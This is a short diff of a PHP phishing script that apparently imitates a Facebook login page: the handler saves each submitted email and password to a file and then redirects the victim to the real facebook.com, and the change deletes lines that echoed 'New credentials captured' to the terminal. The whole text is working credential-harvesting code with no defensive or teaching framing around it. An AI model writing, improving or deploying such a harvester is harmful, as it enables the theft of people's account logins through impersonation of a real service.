@@ -9,11 +9,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     fwrite($file, "Email: $email\nPassword: $password\n\n");
     fclose($file);
 
-    // Print the data to the terminal
-    echo "New credentials captured:\n";
-    echo "Email: $email\n";
-    echo "Password: $password\n\n";
-
     // Redirect to the real Facebook login page
     header("Location: https://facebook.com");
     exit();
